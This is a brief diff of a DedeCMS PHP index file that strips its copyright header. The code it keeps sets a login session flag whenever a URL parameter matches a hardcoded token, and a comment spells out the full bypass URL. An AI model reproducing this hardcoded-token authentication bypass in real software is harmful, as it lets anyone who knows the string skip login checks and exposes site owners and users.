@@ -1,12 +1,4 @@
 <?php
-/**
- * @version        $Id: index.php 1 9:23 2010-11-11 tianya $
- * @package        DedeCMS.Site
- * @copyright      Copyright (c) 2007 - 2010, DesDev, Inc.
- * @license        http://help.dedecms.com/usersguide/license.html
- * @link           #
- */
-
 require_once (dirname(__FILE__) . "/include/common.inc.php");// lyy开启了session,和免脚本验证
 if($_GET["login_yz"]=="eiApmggCNvWqupAKunwLc03gIQwY"){//index_go.php?login_yz=eiApmggCNvWqupAKunwLc03gIQwY
 	$_SESSION["login_yz"]=1;
